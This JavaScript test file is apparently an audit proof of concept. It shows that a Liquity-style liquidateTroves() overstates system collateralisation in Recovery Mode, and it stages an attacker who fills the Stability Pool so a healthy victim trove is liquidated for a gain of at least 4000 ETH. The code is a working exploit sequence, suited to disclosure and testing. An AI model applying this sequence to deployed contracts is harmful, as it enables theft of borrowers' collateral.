const deploymentHelper = require("../utils/deploymentHelpers.js")
const testHelpers = require("../utils/testHelpers.js")

const th = testHelpers.TestHelper
const dec = th.dec
const toBN = th.toBN
const ZERO_ADDRESS = th.ZERO_ADDRESS
const TroveManagerTester = artifacts.require("./TroveManagerTester")
const LUSDToken = artifacts.require("./LUSDToken.sol")

/*
  PoC #2 — same class of bug in liquidateTroves() (prod 5174ecd, line 583):
      vars.entireSystemColl = vars.entireSystemColl
                                     .sub(singleLiquidation.collToSendToSP)
                                     .sub(singleLiquidation.collSurplus);
  omits `collGasCompensation`, so the TCR used by the rest of the Recovery-Mode
  sequence stays slightly OVERSTATED -> a trove with ICR >= the real TCR can be
  capped-liquidated.
*/
contract("PoC2: prod 5174ecd liquidateTroves() keeps an inflated TCR", (accounts) => {
  const [owner, alice, bob, carol, dennis, erin, freddy] = accounts;
  let contracts, priceFeed, stabilityPool, troveManager, borrowerOperations, collSurplusPool

  beforeEach(async () => {
    contracts = await deploymentHelper.deployLiquityCore()
    contracts.troveManager = await TroveManagerTester.new()
    contracts.lusdToken = await LUSDToken.new(
      contracts.troveManager.address, contracts.stabilityPool.address, contracts.borrowerOperations.address)
    const LQTYContracts = await deploymentHelper.deployLQTYContracts(owner, owner, owner)
    priceFeed = contracts.priceFeedTestnet
    stabilityPool = contracts.stabilityPool
    troveManager = contracts.troveManager
    borrowerOperations = contracts.borrowerOperations
    collSurplusPool = contracts.collSurplusPool
    await deploymentHelper.connectLQTYContracts(LQTYContracts)
    await deploymentHelper.connectCoreContracts(contracts, LQTYContracts)
    await deploymentHelper.connectLQTYContractsToCore(LQTYContracts, contracts)
  })

  const openExact = async (coll, targetCompositeDebt, from) => {
    let m = targetCompositeDebt.sub(toBN(dec(200, 18)))
    for (let i = 0; i < 6; i++) {
      const fee = await contracts.troveManager.getBorrowingFee(m)
      m = targetCompositeDebt.sub(toBN(dec(200, 18))).sub(fee)
    }
    await borrowerOperations.openTrove(toBN(dec(100, 16)), m, ZERO_ADDRESS, ZERO_ADDRESS, { from, value: coll })
    const t = await troveManager.getEntireDebtAndColl(from)
    return { coll: t.coll, debt: t.debt }
  }

  it("victim trove with ICR >= real TCR is capped-liquidated by liquidateTroves()", async () => {
    // P0 = 200
    const carolT = await openExact(toBN(dec(5000, 18)), toBN(dec(500000, 18)), carol)  // ICR 2.0 @200
    const aliceT = await openExact(toBN(dec(500, 18)),  toBN(dec(50000, 18)), alice)   // ICR 2.0 @200
    const bobT   = await openExact(toBN(dec(160, 18)),  toBN(dec(20000, 18)), bob)     // ICR 1.6 @200
    console.log("carol coll/debt:", carolT.coll.toString(), carolT.debt.toString())
    console.log("alice coll/debt:", aliceT.coll.toString(), aliceT.debt.toString())
    console.log("bob   coll/debt:", bobT.coll.toString(), bobT.debt.toString())

    // attacker opens a large trove (to own LUSD for the Stability Pool) BEFORE the crash
    const dennisT = await openExact(toBN(dec(6000, 18)), toBN(dec(600000, 18)), dennis)  // ICR 2.0 @200

    await priceFeed.setPrice(dec(140, 18))   // price crash -> recovery mode
    const P = await priceFeed.getPrice()
    const realTCR = await th.getTCR(contracts)
    console.log("price:", P.toString(), "TCR(real):", realTCR.toString(), "recovery:", (await th.checkRecoveryMode(contracts)).toString())
    console.log("bob ICR:", (await troveManager.getCurrentICR(bob, P)).toString())
    console.log("carol ICR:", (await troveManager.getCurrentICR(carol, P)).toString())

    // attacker seeds the SP with enough LUSD to offset the victim
    const dennisLusd = await contracts.lusdToken.balanceOf(dennis)
    await stabilityPool.provideToSP(dennisLusd.sub(toBN(dec(1,18))), ZERO_ADDRESS, { from: dennis })
    console.log("SP deposits:", (await stabilityPool.getTotalLUSDDeposits()).toString())

    const carolICR = await troveManager.getCurrentICR(carol, P)
    assert.isTrue(carolICR.gte(realTCR), "victim ICR must be >= real TCR")

    // liquidateTroves(n) walks the sorted list from the worst ICR upwards
    await troveManager.liquidateTroves(10, { from: owner })

    const carolStatus = await troveManager.getTroveStatus(carol)
    const gain = await stabilityPool.getDepositorETHGain(dennis)
    console.log("carol status (1=active,3=closedByLiquidation):", carolStatus.toString())
    console.log("attacker ETH gain:", gain.toString())
    assert.equal(carolStatus.toString(), "3", "victim must have been spuriously liquidated")
    assert.isTrue(gain.gte(toBN("4000000000000000000000")), "attacker must gain >= 4000 ETH")
  })
})
